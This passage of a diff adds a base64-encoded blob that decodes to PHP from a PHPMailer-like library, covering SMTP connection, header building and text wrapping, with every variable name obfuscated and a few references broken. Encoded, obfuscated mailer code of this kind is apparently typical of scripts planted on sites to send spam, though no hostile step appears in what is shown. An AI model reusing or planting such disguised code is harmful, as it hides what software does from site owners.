+CSAgJHRoaXMtPnNtdHAgPSBuZXcgU01UUCgpOwoJCX0KCgkJJHRoaXMtPnNtdHAtPmRvX2RlYnVn
+ID0gJHRoaXMtPlNNVFBEZWJ1ZzsKCQkkeDkzID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsK
+CQkkeDk0ID0gMDsKCQkkeDk1ID0gKCR0aGlzLT5zbXRwLT5Db25uZWN0ZWQoKSk7CgoJCS8qIFJl
+dHJ5IHdoaWxlIHRoZXJlIGlzIG5vIGNvbm5lY3Rpb24gKi8KCQl3aGlsZSgkeDk0IDwgY291bnQo
+JHg5MykgJiYgJHg5NSA9PSBmYWxzZSkgewoJCSAgJHg5NiA9IGFycmF5KCk7CgkJICBpZihlcmVn
+aSgnXiguKyk6KFswLTldKykkJywgJHg5M1skeDk0XSwgJHg5NikpIHsKCQkJJHgzNCA9ICR4OTZb
+MV07CgkJCSR4MzUgPSAkeDk2WzJdOwoJCSAgfSBlbHNlIHsKCQkJJHgzNCA9ICR4OTNbJHg5NF07
+CgkJCSR4MzUgPSAkdGhpcy0+UG9ydDsKCQkgIH0KCgkJICBpZigkdGhpcy0+c210cC0+Q29ubmVj
+dCgoKCFlbXB0eSgkdGhpcy0+U01UUFNlY3VyZSkpPyR0aGlzLT5TTVRQU2VjdXJlLic6Ly8nOicn
+KS4keDM0LCAkeDM1LCAkdGhpcy0+VGltZW91dCkpIHsKCQkJaWYgKCR0aGlzLT5IZWxvICE9ICcn
+KSB7CgkJCSAgJHRoaXMtPnNtdHAtPkhlbGxvKCR0aGlzLT5IZWxvKTsKCQkJfSBlbHNlIHsKCQkJ
+ICAkdGhpcy0+c210cC0+SGVsbG8oJHRoaXMtPlNlcnZlckhvc3RuYW1lKCkpOwoJCQl9CgoJCQkk
+eDk1ID0gdHJ1ZTsKCQkJaWYoJHRoaXMtPlNNVFBBdXRoKSB7CgkJCSAgaWYoISR0aGlzLT5zbXRw
+LT5BdXRoZW50aWNhdGUoJHRoaXMtPlVzZXJuYW1lLCAkdGhpcy0+UGFzc3dvcmQpKSB7CgkJCQkk
+dGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2F1dGhlbnRpY2F0ZScpKTsKCQkJCSR0aGlzLT5z
+bXRwLT5SZXNldCgpOwoJCQkJJHg5NSA9IGZhbHNlOwoJCQkgIH0KCQkJfQoJCSAgfQoJCSAgJHg5
+NCsrOwoJCX0KCQlpZighJHg5NSkgewoJCSAgJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCdj
+b25uZWN0X2hvc3QnKSk7CgkJfQoKCQlyZXR1cm4gJHg5NTsKCSAgfQoKCSAgLyoqCgkgICAqIENs
+b3NlcyB0aGUgYWN0aXZlIFNNVFAgc2Vzc2lvbiBpZiBvbmUgZXhpc3RzLgoJICAgKiBAcmV0dXJu
+IHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIFNtdHBDbG9zZSgpIHsKCQlpZigkdGhpcy0+c210cCAh
+PSBOVUxMKSB7CgkJICBpZigkdGhpcy0+c210cC0+Q29ubmVjdGVkKCkpIHsKCQkJJHRoaXMtPnNt
+dHAtPlF1aXQoKTsKCQkJJHRoaXMtPnNtdHAtPkNsb3NlKCk7CgkJICB9CgkJfQoJICB9CgoJICAv
+KioKCSAgICogU2V0cyB0aGUgbGFuZ3VhZ2UgZm9yIGFsbCBjbGFzcyBlcnJvciBtZXNzYWdlcy4g
+IFJldHVybnMgZmFsc2UKCSAgICogaWYgaXQgY2Fubm90IGxvYWQgdGhlIGxhbmd1YWdlIGZpbGUu
+ICBUaGUgZGVmYXVsdCBsYW5ndWFnZSB0eXBlCgkgICAqIGlzIEVuZ2xpc2guCgkgICAqIEBwYXJh
+bSBzdHJpbmcgJHg5NyBUeXBlIG9mIGxhbmd1YWdlIChlLmcuIFBvcnR1Z3Vlc2U6ICJiciIpCgkg
+ICAqIEBwYXJhbSBzdHJpbmcgJHg5OCBQYXRoIHRvIHRoZSBsYW5ndWFnZSBmaWxlIGRpcmVjdG9y
+eQoJICAgKiBAYWNjZXNzIHB1YmxpYwoJICAgKiBAcmV0dXJuIGJvb2wKCSAgICovCgkgIGZ1bmN0
+aW9uIFNldExhbmd1YWdlKCR4OTcsICR4OTggPSAnbGFuZ3VhZ2UvJykgewoJCWlmKGZpbGVfZXhp
+c3RzKCR4OTguJ3BocG1haWxlci5sYW5nLScuJHg5Ny4nLnBocCcpKSB7CgkJICBpbmNsdWRlKCR4
+OTguJ3BocG1haWxlci5sYW5nLScuJHg5Ny4nLnBocCcpOwoJCX0gZWxzZWlmIChmaWxlX2V4aXN0
+cygkeDk4LidwaHBtYWlsZXIubGFuZy1lbi5waHAnKSkgewoJCSAgaW5jbHVkZSgkeDk4LidwaHBt
+YWlsZXIubGFuZy1lbi5waHAnKTsKCQl9IGVsc2UgewoJCSAgJHRoaXMtPlNldEVycm9yKCdDb3Vs
+ZCBub3QgbG9hZCBsYW5ndWFnZSBmaWxlJyk7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoJCSR0aGlz
+LT5sYW5ndWFnZSA9ICR4OTk7CgoJCXJldHVybiB0cnVlOwoJICB9CgoJICAvLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkgIC8vIE1FVEhPRFMsIE1FU1NB
+R0UgQ1JFQVRJT04KCSAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLwoKCSAgLyoqCgkgICAqIENyZWF0ZXMgcmVjaXBpZW50IGhlYWRlcnMuCgkgICAqIEBh
+Y2Nlc3MgcHJpdmF0ZQoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAgZnVuY3Rpb24gQWRk
+ckFwcGVuZCgkeDlhLCAkeDliKSB7CgkJJHg5YyA9ICR4OWEgLiAnOiAnOwoJCSR4OWMgLj0gJHRo
+aXMtPkFkZHJGb3JtYXQoJHg5YlswXSk7CgkJaWYoY291bnQoJHg5YikgPiAxKSB7CgkJICBmb3Io
+JHg4YyA9IDE7ICR4OGMgPCBjb3VudCgkeDliKTsgJHg4YysrKSB7CgkJCSR4OWMgLj0gJywgJyAu
+ICR0aGlzLT5BZGRyRm9ybWF0KCR4OWJbJHg4Y10pOwoJCSAgfQoJCX0KCQkkeDljIC49ICR0aGlz
+LT5MRTsKCgkJcmV0dXJuICR4OWM7CgkgIH0KCgkgIC8qKgoJICAgKiBGb3JtYXRzIGFuIGFkZHJl
+c3MgY29ycmVjdGx5LgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVybiBzdHJpbmcK
+CSAgICovCgkgIGZ1bmN0aW9uIEFkZHJGb3JtYXQoJHg5YikgewoJCWlmKGVtcHR5KCR4OWJbMV0p
+KSB7CgkJICAkeDlkID0gJHRoaXMtPlNlY3VyZUhlYWRlcigkeDliWzBdKTsKCQl9IGVsc2UgewoJ
+CSAgJHg5ZCA9ICR0aGlzLT5FbmNvZGVIZWFkZXIoJHRoaXMtPlNlY3VyZUhlYWRlcigkeDliWzFd
+KSwgJ3BocmFzZScpIC4gIiA8IiAuICR0aGlzLT5TZWN1cmVIZWFkZXIoJHg5YlswXSkgLiAiPiI7
+CgkJfQoKCQlyZXR1cm4gJHg5ZDsKCSAgfQoKCSAgLyoqCgkgICAqIFdyYXBzIG1lc3NhZ2UgZm9y
+IHVzZSB3aXRoIG1haWxlcnMgdGhhdCBkbyBub3QKCSAgICogYXV0b21hdGljYWxseSBwZXJmb3Jt
+IHdyYXBwaW5nIGFuZCBmb3IgcXVvdGVkLXByaW50YWJsZS4KCSAgICogT3JpZ2luYWwgd3JpdHRl
+biBieSBwaGlsaXBwZS4KCSAgICogQGFjY2VzcyBwcml2YXRlCgkgICAqIEByZXR1cm4gc3RyaW5n
+CgkgICAqLwoJICBmdW5jdGlvbiBXcmFwVGV4dCgkeDE5LCAkeDllLCAkeDlmID0gZmFsc2UpIHsK
+CQkkeGEwID0gKCR4OWYpID8gc3ByaW50ZigiID0lcyIsICR0aGlzLT5MRSkgOiAkdGhpcy0+TEU7
+CgkJLy8gSWYgdXRmLTggZW5jb2RpbmcgaXMgdXNlZCwgd2Ugd2lsbCBuZWVkIHRvIG1ha2Ugc3Vy
+ZSB3ZSBkb24ndAoJCS8vIHNwbGl0IG11bHRpYnl0ZSBjaGFyYWN0ZXJzIHdoZW4gd2Ugd3JhcAoJ
+CSR4YTEgPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gInV0Zi04Iik7CgoJCSR4MTkg
+PSAkdGhpcy0+Rml4RU9MKCR4MTkpOwoJCWlmIChzdWJzdHIoJHgxOSwgLTEpID09ICR0aGlzLT5M
+RSkgewoJCSAgJHgxOSA9IHN1YnN0cigkeDE5LCAwLCAtMSk7CgkJfQoKCQkkeDQ0ID0gZXhwbG9k
+ZSgkdGhpcy0+TEUsICR4MTkpOwoJCSR4MTkgPSAnJzsKCQlmb3IgKCR4OGM9MCA7JHg4YyA8IGNv
+dW50KCR4NDQpOyAkeDhjKyspIHsKCQkgICR4YTIgPSBleHBsb2RlKCcgJywgJHg0NFskeDhjXSk7
+CgkJICAkeGEzID0gJyc7CgkJICBmb3IgKCR4NTMgPSAwOyAkeDUzPGNvdW50KCR4YTIpOyAkeDUz
+KyspIHsKCQkJJHhhNCA9ICR4YTJbJHg1M107CgkJCWlmICgkeDlmIGFuZCAoc3RybGVuKCR4YTQp
+ID4gJHg5ZSkpIHsKCQkJICAkeGE1ID0gJHg5ZSAtIHN0cmxlbigkeGEzKSAtIDE7CgkJCSAgaWYg
+KCR4NTMgIT0gMCkgewoJCQkJaWYgKCR4YTUgPiAyMCkgewoJCQkJICAkeGE2ID0gJHhhNTsKCQkJ
+CSAgaWYgKCR4YTEpIHsKCQkJCQkkeGE2ID0gJHRoaXMtPlVURjhDaGFyQm91bmRhcnkoJHhhNCwg
+JHhhNik7CgkJCQkgIH0gZWxzZWlmIChzdWJzdHIoJHhhNCwgJHhhNiAtIDEsIDEpID09ICI9Iikg
+ewoJCQkJCSR4YTYtLTsKCQkJCSAgfSBlbHNlaWYgKHN1YnN0cigkeGE0LCAkeGE2IC0gMiwgMSkg
+PT0gIj0iKSB7CgkJCQkJJHhhNiAtPSAyOwoJCQkJICB9CgkJCQkgICR4YTcgPSBzdWJzdHIoJHhh
+NCwgMCwgJHhhNik7CgkJCQkgICR4YTQgPSBzdWJzdHIoJHhhNCwgJHhhNik7CgkJCQkgICR4YTMg
+Lj0gJyAnIC4gJHhhNzsKCQkJCSAgJHgxOSAuPSAkeGEzIC4gc3ByaW50ZigiPSVzIiwgJHRoaXMt
+PkxFKTsKCQkJCX0gZWxzZSB7CgkJCQkgICR4MTkgLj0gJHhhMyAuICR4YTA7CgkJCQl9CgkJCQkk
+eGEzID0gJyc7CgkJCSAgfQoJCQkgIHdoaWxlIChzdHJsZW4oJHhhNCkgPiAwKSB7CgkJCQkkeGE2
+ID0gJHg5ZTsKCQkJCWlmICgkeGExKSB7CgkJCQkgICR4YTYgPSAkdGhpcy0+VVRGOENoYXJCb3Vu
+ZGFyeSgkeGE0LCAkeGE2KTsKCQkJCX0gZWxzZWlmIChzdWJzdHIoJHhhNCwgJHhhNiAtIDEsIDEp
+ID09ICI9IikgewoJCQkJICAkeGE2LS07CgkJCQl9IGVsc2VpZiAoc3Vic3RyKCR4YTQsICR4YTYg
+LSAyLCAxKSA9PSAiPSIpIHsKCQkJCSAgJHhhNiAtPSAyOwoJCQkJfQoJCQkJJHhhNyA9IHN1YnN0
+cigkeGE0LCAwLCAkeGE2KTsKCQkJCSR4YTQgPSBzdWJzdHIoJHhhNCwgJHhhNik7CgoJCQkJaWYg
+KHN0cmxlbigkeGE0KSA+IDApIHsKCQkJCSAgJHgxOSAuPSAkeGE3IC4gc3ByaW50ZigiPSVzIiwg
+JHRoaXMtPkxFKTsKCQkJCX0gZWxzZSB7CgkJCQkgICR4YTMgPSAkeGE3OwoJCQkJfQoJCQkgIH0K
+CQkJfSBlbHNlIHsKCQkJICAkeGE4ID0gJHhhMzsKCQkJICAkeGEzIC49ICgkeDUzID09IDApID8g
+JHhhNCA6ICgnICcgLiAkeGE0KTsKCgkJCSAgaWYgKHN0cmxlbigkeGEzKSA+ICR4OWUgYW5kICR4
+YTggIT0gJycpIHsKCQkJCSR4MTkgLj0gJHhhOCAuICR4YTA7CgkJCQkkeGEzID0gJHhhNDsKCQkJ
+ICB9CgkJCX0KCQkgIH0KCQkgICR4MTkgLj0gJHhhMyAuICR0aGlzLT5MRTsKCQl9CgoJCXJldHVy
+biAkeDE5OwoJICB9CgoJICAvKioKCSAgICogRmluZHMgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkg
+cHJpb3IgdG8gbWF4TGVuZ3RoIGluIGEgdXRmLTgKCSAgICogcXVvdGVkIChwcmludGFibGUpIGVu
+Y29kZWQgc3RyaW5nLgoJICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IENvbGluIEJyb3duLgoJICAg
+KiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHBhcmFtIHN0cmluZyAkeGE5IHV0Zi04IFFQIHRleHQK
+CSAgICogQHBhcmFtIGludCAgICAkeGFhICAgZmluZCBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBw
+cmlvciB0byB0aGlzIGxlbmd0aAoJICAgKiBAcmV0dXJuIGludAoJICAgKi8KCSAgZnVuY3Rpb24g
+VVRGOENoYXJCb3VuZGFyeSgkeGE5LCAkeGFhKSB7CgkJJHhhYiA9IGZhbHNlOwoJCSR4YWMgPSAz
+OwoJCXdoaWxlICghJHhhYikgewoJCSAgJHhhZCA9IHN1YnN0cigkeGE5LCAkeGFhIC0gJHhhYywg
+JHhhYyk7CgkJICAkeGFlID0gc3RycG9zKCR4YWQsICI9Iik7CgkJICBpZiAoJHhhZSAhPT0gZmFs
+c2UpIHsKCQkJLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4g
+JHhhYyBibG9jay4KCQkJLy8gQ2hlY2sgdGhlIGVuY29kZWQgYnl0ZSB2YWx1ZSAodGhlIDIgY2hh
+cnMgYWZ0ZXIgdGhlICc9JykKCQkJJHhhZiA9IHN1YnN0cigkeGE5LCAkeGFhIC0gJHhhYyArICR4
+YWUgKyAxLCAyKTsKCQkJJHhiMCA9IGhleGRlYygkeGFmKTsKCQkJaWYgKCR4YjAgPCAxMjgpIHsg
+Ly8gU2luZ2xlIGJ5dGUgY2hhcmFjdGVyLgoJCQkgIC8vIElmIHRoZSBlbmNvZGVkIGNoYXIgd2Fz
+IGZvdW5kIGF0IHBvcyAwLCBpdCB3aWxsIGZpdAoJCQkgIC8vIG90aGVyd2lzZSByZWR1Y2UgbWF4
+TGVuZ3RoIHRvIHN0YXJ0IG9mIHRoZSBlbmNvZGVkIGNoYXIKCQkJICAkeGFhID0gKCR4YWUgPT0g
+MCkgPyAkeGFhIDoKCQkJICAkeGFhIC0gKCR4YWMgLSAkeGFlKTsKCQkJICAkeGFiID0gdHJ1ZTsK
+CQkJfSBlbHNlaWYgKCR4YjAgPj0gMTkyKSB7IC8vIEZpcnN0IGJ5dGUgb2YgYSBtdWx0aSBieXRl
+IGNoYXJhY3RlcgoJCQkgIC8vIFJlZHVjZSBtYXhMZW5ndGggdG8gc3BsaXQgYXQgc3RhcnQgb2Yg
+Y2hhcmFjdGVyCgkJCSAgJHhhYSA9ICR4YWEgLSAoJHhhYyAtICR4YWUpOwoJCQkgICR4YWIgPSB0
+cnVlOwoJCQl9IGVsc2VpZiAoJHhiMCA8IDE5MikgeyAvLyBNaWRkbGUgYnl0ZSBvZiBhIG11bHRp
+IGJ5dGUgY2hhcmFjdGVyLCBsb29rIGZ1cnRoZXIgYmFjawoJCQkgICR4YWMgKz0gMzsKCQkJfQoJ
+CSAgfSBlbHNlIHsKCQkJLy8gTm8gZW5jb2RlZCBjaGFyYWN0ZXIgZm91bmQKCQkJJHhhYiA9IHRy
+dWU7CgkJICB9CgkJfQoJCXJldHVybiAkeGFhOwoJICB9CgoJICAvKioKCSAgICogU2V0IHRoZSBi
+b2R5IHdyYXBwaW5nLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVybiB2b2lkCgkg
+ICAqLwoJICBmdW5jdGlvbiBTZXRXb3JkV3JhcCgpIHsKCQlpZigkdGhpcy0+V29yZFdyYXAgPCAx
+KSB7CgkJICByZXR1cm47CgkJfQoKCQlzd2l0Y2goJHRoaXMtPm1lc3NhZ2VfdHlwZSkgewoJCSAg
+Y2FzZSAnYWx0JzoKCQkJLyogZmFsbCB0aHJvdWdoICovCgkJICBjYXNlICdhbHRfYXR0YWNobWVu
+dHMnOgoJCQkkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT5XcmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwg
+JHRoaXMtPldvcmRXcmFwKTsKCQkJYnJlYWs7CgkJICBkZWZhdWx0OgoJCQkkdGhpcy0+Qm9keSA9
+ICR0aGlzLT5XcmFwVGV4dCgkdGhpcy0+Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKCQkJYnJlYWs7
+CgkJfQoJICB9CgoJICAvKioKCSAgICogQXNzZW1ibGVzIG1lc3NhZ2UgaGVhZGVyLgoJICAgKiBA
+YWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIENy
+ZWF0ZUhlYWRlcigpIHsKCQkkeDg5ID0gJyc7CgoJCS8qIFNldCB0aGUgYm91bmRhcmllcyAqLwoJ
+CSR4YjEgPSBtZDUodW5pcWlkKHRpbWUoKSkpOwoJCSR0aGlzLT5ib3VuZGFyeVsxXSA9ICdiMV8n
+IC4gJHhiMTsKCQkkdGhpcy0+Ym91bmRhcnlbMl0gPSAnYjJfJyAuICR4YjE7CgoJCSR4ODkgLj0g
+JHRoaXMtPkhlYWRlckxpbmUoJ0RhdGUnLCAkdGhpcy0+UkZDRGF0ZSgpKTsKCQlpZigkdGhpcy0+
+U2VuZGVyID09ICcnKSB7CgkJICAkeDg5IC49ICR0aGlzLT5IZWFkZXJMaW5lKCdSZXR1cm4tUGF0
+aCcsIHRyaW0oJHRoaXMtPkZyb20pKTsKCQl9IGVsc2UgewoJCSAgJHg4OSAuPSAkdGhpcy0+SGVh
+ZGVyTGluZSgnUmV0dXJuLVBhdGgnLCB0cmltKCR0aGlzLT5TZW5kZXIpKTsKCQl9CgoJCS8qIFRv
+IGJlIGNyZWF0ZWQgYXV0b21hdGljYWxseSBieSBtYWlsKCkgKi8KCQlpZigkdGhpcy0+TWFpbGVy
+ICE9ICdtYWlsJykgewoJCSAgaWYoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKCQkJJHg4OSAuPSAk
+dGhpcy0+QWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOwoJCSAgfSBlbHNlaWYgKGNvdW50KCR0
+aGlzLT5jYykgPT0gMCkgewoJCQkkeDg5IC49ICR0aGlzLT5IZWFkZXJMaW5lKCdUbycsICd1bmRp
+c2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKCQkgIH0KCQkgIGlmKGNvdW50KCR0aGlzLT5jYykgPiAw
+KSB7CgkJCSR4ODkgLj0gJHRoaXMtPkFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsKCQkgIH0K
+CQl9CgoJCSR4MWIgPSBhcnJheSgpOwoJCSR4MWJbMF1bMF0gPSB0cmltKCR0aGlzLT5Gcm9tKTsK
+CQkkeDFiWzBdWzFdID0gJHRoaXMtPkZyb21OYW1lOwoJCSR4ODkgLj0gJHRoaXMtPkFkZHJBcHBl
+bmQoJ0Zyb20nLCAkeDFiKTsKCgkJLyogc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IENjIGZy
+b20gdGhlIGhlYWRlciBiZWZvcmUgc2VuZGluZyAqLwoJCWlmKCgoJHRoaXMtPk1haWxlciA9PSAn
+c2VuZG1haWwnKSB8fCAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpKSAmJiAoY291bnQoJHRoaXMt
+PmNjKSA+IDApKSB7CgkJICAkeDg5IC49ICR0aGlzLT5BZGRyQXBwZW5kKCdDYycsICR0aGlzLT5j
+Yyk7CgkJfQoKCQkvKiBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQmNjIGZyb20gdGhlIGhl
+YWRlciBiZWZvcmUgc2VuZGluZyAqLwoJCWlmKCgoJHRoaXMtPk1haWxlciA9PSAnc2VuZG1haWwn
+KSB8fCAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpKSAmJiAoY291bnQoJHRoaXMtPmJjYykgPiAw
+KSkgewoJCSAgJHg4OSAuPSAkdGhpcy0+QWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7CgkJ
+fQoJCWlmKCR4MjIgIT0gIiIpCgkJewoJCWlmKGNvdW50KCR0aGlzLT5SZXBseVRvKSA+IDApIHsK
+CQkgICR4ODkgLj0gJHRoaXMtPkFkZHJBcHBlbmQoJ1JlcGx5LVRvJywgJHRoaXMtPlJlcGx5VG8p
+OwoJCX0KCQl9CgkJLyogbWFpbCgpIHNldHMgdGhlIHN1YmplY3QgaXRzZWxmICovCgkJaWYoJHRo
+aXMtPk1haWxlciAhPSAnbWFpbCcpIHsKCQkgICR4ODkgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ1N1
+YmplY3QnLCAkdGhpcy0+RW5jb2RlSGVhZGVyKCR0aGlzLT5TZWN1cmVIZWFkZXIoJHRoaXMtPlN1
+YmplY3QpKSk7CgkJfQoKCQlpZigkdGhpcy0+TWVzc2FnZUlEICE9ICcnKSB7CgkJICAkeDg5IC49
+ICR0aGlzLT5IZWFkZXJMaW5lKCdNZXNzYWdlLUlEJywkdGhpcy0+TWVzc2FnZUlEKTsKCQl9IGVs
+c2UgewoJCSAgJHg4OSAuPSBzcHJpbnRmKCJNZXNzYWdlLUlEOiA8JXNAJXM+JXMiLCAkeGIxLCAk
+dGhpcy0+U2VydmVySG9zdG5hbWUoKSwgJHRoaXMtPkxFKTsKCQl9CgkJJHg4OSAuPSAkdGhpcy0+
+SGVhZGVyTGluZSgnWC1Qcmlvcml0eScsICR0aGlzLT5Qcmlvcml0eSk7CgkJaWYoJHRoaXMtPkNv
+bmZpcm1SZWFkaW5nVG8gIT0gJycpIHsKCQkgICR4ODkgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0Rp
+c3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuIHRyaW0oJHRoaXMtPkNvbmZpcm1SZWFk
+aW5nVG8pIC4gJz4nKTsKCQl9CgoJCS8vIEFkZCBjdXN0b20gaGVhZGVycwoJCWZvcigkeDk0ID0g
+MDsgJHg5NCA8IGNvdW50KCR0aGlzLT5DdXN0b21IZWFkZXIpOyAkeDk0KyspIHsKCQkgICR4ODkg
+Lj0gJHRoaXMtPkhlYWRlckxpbmUodHJpbSgkdGhpcy0+Q3VzdG9tSGVhZGVyWyR4OTRdWzBdKSwg
+JHRoaXMtPkVuY29kZUhlYWRlcih0cmltKCR0aGlzLT5DdXN0b21IZWFkZXJbJHg5NF1bMV0pKSk7
+CgkJfQoJCWlmICghJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKCQkgICR4ODkgLj0gJHRoaXMtPkhl
+YWRlckxpbmUoJ01JTUUtVmVyc2lvbicsICcxLjAnKTsKCQkgICR4ODkgLj0gJHRoaXMtPkdldE1h
+aWxNSU1FKCk7CgkJfQoKCQlyZXR1cm4gJHg4OTsKCSAgfQoKCSAgLyoqCgkgICAqIFJldHVybnMg
+dGhlIG1lc3NhZ2UgTUlNRS4KCSAgICogQGFjY2VzcyBwcml2YXRlCgkgICAqIEByZXR1cm4gc3Ry
+aW5nCgkgICAqLwoJICBmdW5jdGlvbiBHZXRNYWlsTUlNRSgpIHsKCQkkeDg5ID0gJyc7CgkJc3dp
+dGNoKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKCQkgIGNhc2UgJ3BsYWluJzoKCQkJJHg4OSAuPSAk
+dGhpcy0+SGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICR0aGlzLT5FbmNv
+ZGluZyk7CgkJCSR4ODkgLj0gc3ByaW50ZigiQ29udGVudC1UeXBlOiAlczsgY2hhcnNldD1cIiVz
+XCIiLCAkdGhpcy0+Q29udGVudFR5cGUsICR0aGlzLT5DaGFyU2V0KTsKCQkJYnJlYWs7CgkJICBj
+YXNlICdhdHRhY2htZW50cyc6CgkJCS8qIGZhbGwgdGhyb3VnaCAqLwoJCSAgY2FzZSAnYWx0X2F0
+dGFjaG1lbnRzJzoKCQkJaWYoJHRoaXMtPklubGluZUltYWdlRXhpc3RzKCkpewoJCQkgICR4ODkg
+Lj0gc3ByaW50ZigiQ29udGVudC1UeXBlOiAlczslc1x0dHlwZT1cInRleHQvaHRtbFwiOyVzXHRi
+b3VuZGFyeT1cIiVzXCIlcyIsICdtdWx0aXBhcnQvcmVsYXRlZCcsICR0aGlzLT5MRSwgJHRoaXMt
+PkxFLCAkdGhpcy0+Ym91bmRhcnlbMV0sICR0aGlzLT5MRSk7CgkJCX0gZWxzZSB7CgkJCSAgJHg4
+OSAuPSAkdGhpcy0+SGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9taXhlZDsn
+KTsKCQkJICAkeDg5IC49ICR0aGlzLT5UZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+
+Ym91bmRhcnlbMV0gLiAnIicpOwoJCQl9CgkJCWJyZWFrOwoJCSAgY2FzZSAnYWx0JzoKCQkJJHg4
+OSAuPSAkdGhpcy0+SGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5h
+dGl2ZTsnKTsKCQkJJHg4OSAuPSAkdGhpcy0+VGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRo
+aXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKCQkJYnJlYWs7CgkJfQoKCQlpZigkdGhpcy0+TWFpbGVy
+ICE9ICdtYWlsJykgewoJCSAgJHg4OSAuPSAkdGhpcy0+TEUuJHRoaXMtPkxFOwoJCX0KCgkJcmV0
+dXJuICR4ODk7CgkgIH0KCgkgIC8qKgoJICAgKiBBc3NlbWJsZXMgdGhlIG1lc3NhZ2UgYm9keS4g
+IFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCgkgICAqIEBhY2Nlc3MgcHJpdmF0
+ZQoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAgZnVuY3Rpb24gQ3JlYXRlQm9keSgpIHsK
+CQkkeDg5ID0gJyc7CgkJaWYgKCR0aGlzLT5zaWduX2tleV9maWxlKSB7CgkJICAkeDg5IC49ICR0
+aGlzLT5HZXRNYWlsTUlNRSgpOwoJCX0KCgkJJHRoaXMtPlNldFdvcmRXcmFwKCk7CgoJCXN3aXRj
+aCgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CgkJICBjYXNlICdhbHQnOgoJCQkkeDg5IC49ICR0aGlz
+LT5HZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICcnLCAndGV4dC9wbGFpbicsICcnKTsK
+CQkJJHg4OSAuPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkdGhpcy0+RW5j
+b2RpbmcpOwoJCQkkeDg5IC49ICR0aGlzLT5MRS4kdGhpcy0+TEU7CgkJCSR4ODkgLj0gJHRoaXMt
+PkdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJycsICd0ZXh0L2h0bWwnLCAnJyk7CgkJ
+CSR4ODkgLj0gJHRoaXMtPkVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5n
+KTsKCQkJJHg4OSAuPSAkdGhpcy0+TEUuJHRoaXMtPkxFOwoJCQkkeDg5IC49ICR0aGlzLT5FbmRC
+b3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOwoJCQlicmVhazsKCQkgIGNhc2UgJ3BsYWluJzoK
+CQkJJHg4OSAuPSAkdGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2Rp
+bmcpOwoJCQlicmVhazsKCQkgIGNhc2UgJ2F0dGFjaG1lbnRzJzoKCQkJJHg4OSAuPSAkdGhpcy0+
+R2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAnJywgJycsICcnKTsKCQkJJHg4OSAuPSAk
+dGhpcy0+RW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwoJCQkkeDg5
+IC49ICR0aGlzLT5MRTsKCQkJJHg4OSAuPSAkdGhpcy0+QXR0YWNoQWxsKCk7CgkJCWJyZWFrOwoJ
+CSAgY2FzZSAnYWx0X2F0dGFjaG1lbnRzJzoKCQkJJHg4OSAuPSBzcHJpbnRmKCItLSVzJXMiLCAk
+dGhpcy0+Ym91bmRhcnlbMV0sICR0aGlzLT5MRSk7CgkJCSR4ODkgLj0gc3ByaW50ZigiQ29udGVu
